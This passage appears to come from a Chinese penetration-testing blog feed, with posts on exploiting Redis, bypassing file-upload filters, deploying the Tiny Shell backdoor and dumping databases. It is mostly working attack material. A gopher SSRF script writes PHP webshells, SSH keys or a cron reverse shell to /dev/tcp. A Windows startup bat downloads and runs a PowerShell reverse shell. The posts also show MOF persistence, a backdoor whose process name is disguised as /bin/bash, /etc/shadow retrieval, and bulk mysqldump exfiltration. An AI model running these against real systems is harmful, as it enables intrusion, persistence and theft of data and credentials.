class="line">CONTINUE：表示可以进行增量同步</span><br><span class="line">ERR：表示主服务器还不支持PSYNC</span><br></pre></td></tr></table></figure><p>3.加载模块</br></p><p>设置主从关系：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">slaveof &lt;vpsIP&gt; &lt;PORT&gt;</span><br></pre></td></tr></table></figure><p>这里直接有现成的脚本可以用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;LoRexxar&#x2F;redis-rogue-server.git</span><br><span class="line"># 进入redis-rogue-server</span><br><span class="line">cd redis-rogue-server</span><br></pre></td></tr></table></figure><p>下载.so&amp;编译</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;RedisModules-ExecuteCommand.git</span><br><span class="line"># 进入RedisModules-ExecuteCommand</span><br><span class="line">cd RedisModules-ExecuteCommand</span><br><span class="line"># 编译</span><br><span class="line">make</span><br><span class="line"># 复制到和redis-rogue-server.py 同一个文件夹</span><br><span class="line">cp module.so ..&#x2F;exp.so</span><br><span class="line"># 退到上一级目录</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure><p>攻击：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost &lt;targetIP&gt; --lhost &lt;vpsIP&gt;</span><br></pre></td></tr></table></figure><h3 id="通过脚本执行命令"><a href="#通过脚本执行命令" class="headerlink" title="通过脚本执行命令"></a>通过脚本执行命令</h3><p>下载脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;redis-rogue-getshell.git</span><br></pre></td></tr></table></figure><p>进入目录&amp;编译exp.so</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd redis-rogue-getshell&#x2F;RedisModulesSDK&#x2F;</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -p 端口号默认是6379，不写也没什么关系</span><br><span class="line">python3 redis-master.py -r &lt;RHOST&gt; -p &lt;RPORT&gt; -L &lt;LHOST&gt; -P &lt;LPORT&gt; -f RedisModulesSDK&#x2F;exp.so -c &quot;&lt;COMMAND&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="Redis的SSRF利用"><a href="#Redis的SSRF利用" class="headerlink" title="Redis的SSRF利用"></a>Redis的SSRF利用</h3><p>这里我们需要了解一下RESP协议：RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。想了解的移步<a href="https://moelove.info/2017/03/05/%E7%90%86%E8%A7%A3-Redis-%E7%9A%84-RESP-%E5%8D%8F%E8%AE%AE/">理解 Redis 的 RESP 协议</a><br>我们通过Redis配合Gopher协议进行SSRF进行反序列化攻击，Gopher协议是HTTP协议出现之前，在Internet上常见且常用的一个协议，利用此协议可以攻击内网的redis、ftp等等，也可以发送GET、POST请求，这里的操作无非是把刚才的通过反序列化复现一遍：</p><h4 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1.写webshell"></a>1.写webshell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># redis命令</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">set shell &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br></pre></td></tr></table></figure><p>生成命令脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># redis_ssrf.py</span><br><span class="line">import urllib</span><br><span class="line">protocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;</span><br><span class="line">ip&#x3D;&quot;&lt;targetIP&gt;&quot;</span><br><span class="line">port&#x3D;&quot;6379&quot;</span><br><span class="line">key&#x3D;&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span><br><span class="line">filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">path&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;</span><br><span class="line">passwd&#x3D;&quot;&quot;</span><br><span class="line">cmd&#x3D;[&quot;flushall&quot;,</span><br><span class="line">     &quot;set 1 &#123;&#125;&quot;.format(key.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class="line">     &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class="line">     &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class="line">     &quot;save&quot;</span><br><span class="line">     ]</span><br><span class="line">if passwd:</span><br><span class="line">    cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class="line">payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;</span><br><span class="line">def redis_format(arr):</span><br><span class="line">    CRLF&#x3D;&quot;\r\n&quot;</span><br><span class="line">    redis_arr &#x3D; arr.split(&quot; &quot;)</span><br><span class="line">    cmd&#x3D;&quot;&quot;</span><br><span class="line">    cmd+&#x3D;&quot;*&quot;+str(len(redis_arr))</span><br><span class="line">    for x in redis_arr:</span><br><span class="line">        cmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">    cmd+&#x3D;CRLF</span><br><span class="line">    return cmd</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    for x in cmd:</span><br><span class="line">        payload +&#x3D; urllib.quote(redis_format(x))</span><br><span class="line">    print payload</span><br></pre></td></tr></table></figure><p>运行一下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 这里用的是python2运行的</span><br><span class="line">python redis_ssrf.py</span><br></pre></td></tr></table></figure><h4 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h4><p>如果.ssh目录存在，则直接写入~/.ssh/authorized_keys,如果不存在，则可以利用crontab创建该目录<br>第一步还是创建ssh公钥,就不复述了</br><br>需要设置的参数：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下面这个值就是ssh_key.txt里面的值</span><br><span class="line">set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaHfS8kMteTc28d8&#x2F;ws2oSF9KL2y0dQQ5&#x2F;1tDm8nWPLbw77C0IBJb9bgfCiqM4gUEhtlLAv4YLFM9Y21+0qrsHcbdTUjJ7iZuUOblsXnCz+jS+cSIc4rlPrnoefbDnLjuDwl4EfYs7wONOFzrkSReTmGiYATnCEJ0EitY0BiUAHGhUUxBpQ0USWBTc8z2B49knGdtqMo8NjkzDc9LtZQhqVe29Ti3nAcy3kKaHhfkgJNFX0AmIKS4aa+eudat6V5vYMWJS0a143&#x2F;479W1Uqs1yQ8yljhcHI1K0WJsrFIzVl7PbPMxbjzDSXuA5rehi2Gu1uJWleoVcwNqhblBOBopC8K0AJTDwmMA5DKgElzis2U8IkwfgTE2+v+znRLU0sbv4oPSADzPS0AbZD2V5MEcMgDmJ1zVzkpM12xSDU4mnonUph7LTNIUwoVnNL9O4CL6TFjyR+IfpDn9VdemdqgXEm2xUxAFwq+LIPm1lNSahQcqupWGHYlEDyH9kOajBK+s&#x3D; root@kali</span><br><span class="line">&#39;</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br></pre></td></tr></table></figure><p>直接在脚本里面改动：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key&#x3D;&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaHfS8kMteTc28d8&#x2F;ws2oSF9KL2y0dQQ5&#x2F;1tDm8nWPLbw77C0IBJb9bgfCiqM4gUEhtlLAv4YLFM9Y21+0qrsHcbdTUjJ7iZuUOblsXnCz+jS+cSIc4rlPrnoefbDnLjuDwl4EfYs7wONOFzrkSReTmGiYATnCEJ0EitY0BiUAHGhUUxBpQ0USWBTc8z2B49knGdtqMo8NjkzDc9LtZQhqVe29Ti3nAcy3kKaHhfkgJNFX0AmIKS4aa+eudat6V5vYMWJS0a143&#x2F;479W1Uqs1yQ8yljhcHI1K0WJsrFIzVl7PbPMxbjzDSXuA5rehi2Gu1uJWleoVcwNqhblBOBopC8K0AJTDwmMA5DKgElzis2U8IkwfgTE2+v+znRLU0sbv4oPSADzPS0AbZD2V5MEcMgDmJ1zVzkpM12xSDU4mnonUph7LTNIUwoVnNL9O4CL6TFjyR+IfpDn9VdemdqgXEm2xUxAFwq+LIPm1lNSahQcqupWGHYlEDyH9kOajBK+s&#x3D; root@kali\n\n&quot;</span><br><span class="line">filename&#x3D;&quot;authorized_keys&quot;</span><br><span class="line">path&#x3D;&quot;&#x2F;root&#x2F;.ssh&#x2F;&quot;</span><br></pre></td></tr></table></figure><h4 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h4><p>命令是一样的，修改脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reverse_ip&#x3D;&quot;&lt;VPSIP&gt;&quot;</span><br><span class="line">reverse_port&#x3D;&quot;&lt;VPSPORT&gt;&quot;</span><br><span class="line">key&#x3D;&quot;\n\n\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;%s 0&gt;&amp;1\n\n\n\n&quot;%(reverse_ip,reverse_port)</span><br><span class="line">filename&#x3D;&quot;root&quot;</span><br><span class="line">path&#x3D;&quot;&#x2F;var&#x2F;spool&#x2F;cron&quot;</span><br></pre></td></tr></table></figure><h2 id="0x05-Windows中的Redis利用"><a href="#0x05-Windows中的Redis利用" class="headerlink" title="0x05 Windows中的Redis利用"></a>0x05 Windows中的Redis利用</h2><p>我用的是Redis 5.0.9的版本，下载地址：<a href="https://github.com/tporadowski/redis/releases/tag/v5.0.9">Redis v5.0.9</a></p><h3 id="最熟悉的当然是web目录写文件了"><a href="#最熟悉的当然是web目录写文件了" class="headerlink" title="最熟悉的当然是web目录写文件了"></a>最熟悉的当然是web目录写文件了</h3><p>条件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">web目录已知且可写</span><br></pre></td></tr></table></figure><p>下载我们需要的工具:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 此脚本是通过 Redis 主从写出无损文件，可用于 Windows 平台下写出无损的 EXE、DLL、 LNK 和 Linux 下的 OS 等二进制文件,也可以用无杂质覆写 Linux 中的 &#x2F;etc&#x2F;shadow</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;r35tart&#x2F;RedisWriteFile.git</span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 RedisWriteFile.py --rhost&#x3D;[target_ip] --rport&#x3D;[target_redis_port] --lhost&#x3D;[evil_master_host] --lport&#x3D;[random] --rpath&#x3D;&quot;[path_to_write]&quot; --rfile&#x3D;&quot;[filename]&quot; --lfile&#x3D;[filename]</span><br></pre></td></tr></table></figure><h3 id="通过启动项"><a href="#通过启动项" class="headerlink" title="通过启动项"></a>通过启动项</h3><p>Windows的自启动有几类：系统服务、计划任务、注册表启动项、用户的startup目录。其中前三种是无法通过单纯向某目录中写文件实现精准篡改的，因此只有startup目录可以利用。</br><br>条件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名已知</span><br><span class="line">Startup 存在且可写</span><br><span class="line">需要目标机器重启</span><br></pre></td></tr></table></figure><p>startup的绝对路径如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>还是刚才用到的工具RedisWriteFile：</br><br>写入的可以是msf和cs的马等等，方法多多，最简单的就是bat文件了，我这里通过写入powershell进行反弹。</br></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># bat内容</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444</span><br></pre></td></tr></table></figure><p>监听：nv lvvp 4444 并等待目标重启就好了</p><h3 id="劫持利用"><a href="#劫持利用" class="headerlink" title="劫持利用"></a>劫持利用</h3><p>劫持的方式也有很多，方法包括但不限于如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">系统DLL劫持（需要目标重启或注销）</span><br><span class="line">针对特定软件的DLL劫持（需要知道软件的绝对路径，需要目标一次点击）</span><br><span class="line">覆写目标的快捷方式（需要知道用户名，需要目标一次点击）</span><br><span class="line">覆写特定软件的配置文件达到提权目的（目标无需点击或一次点击，主要看是什么软件）</span><br><span class="line">覆写sethc.exe粘滞键（需要可以登录3389）</span><br></pre></td></tr></table></figure><p>上面涉及系统目录的操作，所以Redis权限要很高，比较通用的方法是向system32目录下写文件：</br><br>但NT6及以上操作系统的UAC必须关掉，或Redis以SYSTEM权限启动，否则脚本显示成功但实际上是无法写入的。</p><h3 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h3><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：C:/windows/system32/wbem/mof/nullevt.mof，其作用是每隔五秒就会去监控进程创建和死亡。但这个默认5秒执行一次的设定只有03及以下系统才会有。<br>关于更多mof操作可以参考<a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html">Powershell之MOF后门</a>,以下脚本只是一个示例，在我们打开记事本的时候给你关掉。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#PRAGMA NAMESPACE (&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of CommandLineEventConsumer as $Cons</span><br><span class="line">&#123;</span><br><span class="line">    Name &#x3D; &quot;Powershell Helper 2&quot;;</span><br><span class="line">    RunInteractively&#x3D;false;</span><br><span class="line">    CommandLineTemplate&#x3D;&quot;cmd &#x2F;C powershell.exe Stop-Process -processname notepad -Force&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __EventFilter as $Filt</span><br><span class="line">&#123;</span><br><span class="line">    Name &#x3D; &quot;EventFilter 2&quot;;</span><br><span class="line">    EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Query &#x3D;&quot;SELECT * FROM __InstanceCreationEvent Within 3&quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_Process\&quot; &quot;</span><br><span class="line">            &quot;And Targetinstance.Name &#x3D; \&quot;notepad.exe\&quot; &quot;;</span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123; </span><br><span class="line">     Filter &#x3D; $Filt;</span><br><span class="line">     Consumer &#x3D; $Cons;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将其保存为nullevt.mof并写入C:/windows/system32/wbem/mof路径下<br>xp以上的需要我们通过mofcomp.exe来编译进行触发操作</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mofcomp.exe C:\Windows\System32\wbem\MOF\nullevt.mof</span><br></pre></td></tr></table></figure><p>参考文章</br><br><a href="https://www.secpulse.com/archives/133759.html">https://www.secpulse.com/archives/133759.html</a></br><br><a href="https://www.anquanke.com/post/id/214108">https://www.anquanke.com/post/id/214108</a></br><br><a href="https://xz.aliyun.com/t/8153">https://xz.aliyun.com/t/8153</a></br><br><a href="https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/">https://evilwing.me/2019/12/30/dll-zhu-ru-dll-jie-chi/</a></br><br><a href="https://buaq.net/go-25846.html">https://buaq.net/go-25846.html</a></br><br><a href="https://www.anquanke.com/post/id/170360">https://www.anquanke.com/post/id/170360</a></br><br><a href="https://xz.aliyun.com/t/7940">https://xz.aliyun.com/t/7940</a></br><br><a href="https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/">https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/</a></br><br><a href="https://xz.aliyun.com/t/8153">https://xz.aliyun.com/t/8153</a></br><br><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></br><br><a href="https://moelove.info/2017/03/05/%E7%90%86%E8%A7%A3-Redis-%E7%9A%84-RESP-%E5%8D%8F%E8%AE%AE/">https://moelove.info/2017/03/05/%E7%90%86%E8%A7%A3-Redis-%E7%9A%84-RESP-%E5%8D%8F%E8%AE%AE/</a></br><br><a href="https://xz.aliyun.com/t/5665">https://xz.aliyun.com/t/5665</a></br><br><a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html">https://evi1cg.me/archives/Powershell_MOF_Backdoor.html</a></br></p>]]></content>
      
      
      <categories>
          
          <category> 利用复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传绕过</title>
      <link href="2020/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"/>
      <url>2020/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h3 id="判断是否存在文件上传漏洞"><a href="#判断是否存在文件上传漏洞" class="headerlink" title="判断是否存在文件上传漏洞"></a>判断是否存在文件上传漏洞</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.判断中间件是否存在解析漏洞</span><br><span class="line">2.通过burp修改文件后缀为任意值判断是否黑白名单（白名单。。。难）</span><br><span class="line">3.上传后是否有返回路径或是否能正常访问到上传的文件</span><br></pre></td></tr></table></figure><h3 id="黑名单与waf判断"><a href="#黑名单与waf判断" class="headerlink" title="黑名单与waf判断"></a>黑名单与waf判断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果上传提示失败或格式不允许这些就表示是黑名单了</span><br><span class="line">直接显示waf拦截就毫无疑问是waf了（垃圾话）</span><br></pre></td></tr></table></figure><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h4><p>大小写不敏感，[空格]，命名不允许的特殊字符，::$DATA，命名不允许的特殊字符/:*?”&lt;&gt;|</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.jsp&#x2F;</span><br><span class="line">1.jsp?</span><br><span class="line">1.jsp*</span><br><span class="line">1.jsp\</span><br><span class="line">1.jsp::$DATA</span><br><span class="line">1.jsp (在最后添加了空格)</span><br></pre></td></tr></table></figure><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux:"></a>Linux:</h4><p>大小写敏感</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大小写敏感就换着来</span><br><span class="line">1.&#x2F;jsp</span><br><span class="line">1.JsP</span><br></pre></td></tr></table></figure><h4 id="拓展名："><a href="#拓展名：" class="headerlink" title="拓展名："></a>拓展名：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">asp&#x2F;cer&#x2F;asa&#x2F;cdx</span><br><span class="line">aspx&#x2F;ashx&#x2F;asmx&#x2F;svc... cshtml&#x2F;vbhtml(.net4.0支持Razor)</span><br><span class="line">jsp&#x2F;jspx</span><br><span class="line">php...</span><br></pre></td></tr></table></figure><h4 id="绕过WAF限制"><a href="#绕过WAF限制" class="headerlink" title="绕过WAF限制:"></a>绕过WAF限制:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例:</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.php&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename值去掉引号</span><br><span class="line">aspx修改为cer</span><br><span class="line">内容可以发大量的垃圾数据或直接免杀</span><br><span class="line">url访问限制的话1.jspx&#x2F;.png可以试一试</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://xz.aliyun.com/t/8084">https://xz.aliyun.com/t/8084</a></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TSH后门的简单使用</title>
      <link href="2020/10/14/tsh%E5%90%8E%E9%97%A8/"/>
      <url>2020/10/14/tsh%E5%90%8E%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="tsh后门"><a href="#tsh后门" class="headerlink" title="tsh后门"></a>tsh后门</h3><p>Tiny Shell 是一款开源的Unix类后门shell工具，由C语言编写，分为客户端和服务端，支持正向连接模式和反弹连接模式。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">功能：</span><br><span class="line">通信加密</span><br><span class="line">支持上传、下载、直接反弹shell</span><br><span class="line"></span><br><span class="line">下载链接：https:&#x2F;&#x2F;github.com&#x2F;orangetw&#x2F;tsh.git</span><br></pre></td></tr></table></figure><h5 id="tsh-h"><a href="#tsh-h" class="headerlink" title="tsh.h"></a>tsh.h</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ifndef _TSH_H</span><br><span class="line">#define _TSH_H</span><br><span class="line"></span><br><span class="line">char *secret &#x3D; &quot;replace with your password&quot;;</span><br><span class="line"></span><br><span class="line">#define SERVER_PORT 7586</span><br><span class="line">#define FAKE_PROC_NAME &quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line"></span><br><span class="line">#define CONNECT_BACK_HOST  &quot;localhost&quot;</span><br><span class="line">#define CONNECT_BACK_DELAY 30</span><br><span class="line"></span><br><span class="line">#define GET_FILE 1</span><br><span class="line">#define PUT_FILE 2</span><br><span class="line">#define RUNSHELL 3</span><br></pre></td></tr></table></figure><p>代码解释</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secret：密码</span><br><span class="line">SERVER_PORT：端口</span><br><span class="line">FAKE_PROC_NAME：用于伪装显示后门运行后的进程名字</span><br><span class="line">CONNECT_BACK_HOST：表示反向连接的主机（就是被控端主动要连接的控制端的IP）</span><br><span class="line">CONNECT_BACK_DELAY：表示隔多久尝试连接控制端一次（进程未结束则一直循环发起请求）</span><br></pre></td></tr></table></figure><p>链接模式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反向链接 从目标向我们发起链接请求</span><br><span class="line">CONNECT_BACK_HOST</span><br><span class="line">CONNECT_BACK_DELAY</span><br><span class="line">正向链接 我们向目标发起链接请求</span><br><span class="line">注释掉</span><br><span class="line">&#x2F;&#x2F;CONNECT_BACK_HOST</span><br><span class="line">&#x2F;&#x2F;CONNECT_BACK_DELAY</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make &lt;system&gt;</span><br><span class="line"># system:linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编译后会出现两个文件：tshd和tsh</span><br><span class="line">正向链接：</span><br><span class="line">目标启动：.&#x2F;tshd(需要一定的权限)</span><br><span class="line">攻击端：.&#x2F;tsh &lt;目标IP&gt;</span><br><span class="line">执行命令：.&#x2F;tsh &lt;hostname&gt; &quot;uname -a&quot;</span><br><span class="line"></span><br><span class="line">反向链接：</span><br><span class="line">控制端执行监听：.&#x2F;tsh cb</span><br><span class="line">目标端运行tsh：.&#x2F;tshd</span><br></pre></td></tr></table></figure><p>文件传输</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;tsh &lt;hostname&gt; get &#x2F;etc&#x2F;shadow .</span><br><span class="line">.&#x2F;tsh &lt;hostname&gt; put vmlinuz &#x2F;boot</span><br><span class="line"></span><br><span class="line"># 不支持多重和&#x2F;或递归文件传输,用以下命令打包成压缩文件传输</span><br><span class="line">.&#x2F;tsh host &quot;stty raw; tar -cf - &#x2F;etc 2&gt;&#x2F;dev&#x2F;null&quot; | tar -xvf </span><br></pre></td></tr></table></figure><p>死机处理</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按Ctrl-C和其他控制键无法正常工作。使用以下方法修复：</span><br><span class="line">% stty intr &quot;^C&quot; erase &quot;^H&quot; eof &quot;^D&quot; susp &quot;^Z&quot; kill &quot;^U&quot;</span><br></pre></td></tr></table></figure><p>注意事项</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># umask设置是为了运行后的后门shell环境而设置，后门shell所有创建的文件只有后门shell进程属主有权限，其他都没权限</span><br><span class="line">umask 077; HOME&#x3D;&#x2F;var&#x2F;tmp</span><br><span class="line"></span><br><span class="line"># 修改tshd 为你要伪装显示的进程名字，如果不修改的话，直接运行后门进程，则使用lsof -i:8080 查看， COMMAND不会显示为tsh.h设置的伪装的</span><br><span class="line">mv tshd bash</span><br><span class="line"># 这里如果需要修改文件名的话，在tsh.c的236行修改</span><br><span class="line">exec bash --login改为：exec &#x2F;bin&#x2F;bash --login</span><br><span class="line"># 不然运行是不会反弹回shell的</span><br><span class="line"></span><br><span class="line"># 将后门文件移动至 &#x2F;usr&#x2F;sbin，如果不移动的话，使用pwdx 进程ID 可以查看到后门进程所在的执行目录(不想移动的话可以直接删掉该文件)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tsh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>备忘录</title>
      <link href="2020/10/13/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>2020/10/13/%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h3><p>mysqldump：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 全部数据库：</span><br><span class="line">mysqldump -uroot -proot --all-database &gt; &#x2F;usr&#x2F;bin&#x2F;all.sql</span><br><span class="line"># 指定数据库</span><br><span class="line">mysqldump -uroot -proot --database db1 db2 &gt; &#x2F;usr&#x2F;bin&#x2F;all.sql</span><br><span class="line"># 指定数据库指定表</span><br><span class="line">mysqldump -uroot -proot --database db1 --tables t1 t2 &gt;&#x2F;usr&#x2F;bin&#x2F;all.sql</span><br><span class="line"># 指定条件</span><br><span class="line">mysqldump -uroot -proot --databases db1 --tables a1 --where&#x3D;&#39;id&#x3D;1&#39;  &gt;&#x2F;tmp&#x2F;a1.sql</span><br></pre></td></tr></table></figure><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p>linux:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># .tar</span><br><span class="line">    解包：tar xvf FileName.tar</span><br><span class="line">    打包：tar cvf FileName.tar DirName</span><br><span class="line"># .zip</span><br><span class="line">　　解压：unzip FileName.zip</span><br><span class="line">　　压缩：zip FileName.zip DirName</span><br><span class="line">　　压缩：zip -s 100m -r -q -P password file.zip *.sql</span><br><span class="line">　　压缩一个目录使用 -r 参数，-r 递归。例： $ zip -r FileName.zip DirName</span><br><span class="line"># .gz</span><br><span class="line">　　解压1：gunzip FileName.gz</span><br><span class="line">　　解压2：gzip -d FileName.gz</span><br><span class="line">　　压缩：gzip FileName</span><br><span class="line"># .tar.gz和tgz</span><br><span class="line">　　解压：tar zxvf FileName.tar.gz</span><br><span class="line">　　压缩：tar zcvf FileName.tar.gz DirName</span><br><span class="line"># .bz2</span><br><span class="line">　　解压1：bzip2 -d FileName.bz2</span><br><span class="line">　　解压2：bunzip2 FileName.bz2</span><br><span class="line">　　压缩： bzip2 -z FileName</span><br><span class="line"># .tar.bz2</span><br><span class="line">　　解压：tar jxvf FileName.tar.bz2 或tar –bzip xvf FileName.tar.bz2</span><br><span class="line">　　压缩：tar jcvf FileName.tar.bz2 DirName</span><br><span class="line"># .Z</span><br><span class="line">　　解压：uncompress FileName.Z</span><br><span class="line">　　压缩：compress FileName</span><br><span class="line"># .tar.Z</span><br><span class="line">　　解压：tar Zxvf FileName.tar.Z</span><br><span class="line">　　压缩：tar Zcvf FileName.tar.Z DirName</span><br><span class="line"># .rar</span><br><span class="line">　　解压：rar x FileName.rar</span><br><span class="line">　　压缩：rar a FileName.rar DirName</span><br></pre></td></tr></table></figure><p>windows：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rar.exe a -r -v500m -X*.rar -X*.zip sst.rar D:\wwwroot\sq\</span><br></pre></td></tr></table></figure><p>php：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function addFileToZip($path,$zip)&#123;</span><br><span class="line">    $handler&#x3D;opendir($path); &#x2F;&#x2F;打开当前文件夹由$path指定。</span><br><span class="line">    while(($filename&#x3D;readdir($handler))!&#x3D;&#x3D;false)&#123;</span><br><span class="line">        if($filename !&#x3D; &quot;.&quot; &amp;&amp; $filename !&#x3D; &quot;..&quot;)&#123;&#x2F;&#x2F;文件夹文件名字为&#39;.&#39;和‘..’，不要对他们进行操作</span><br><span class="line">           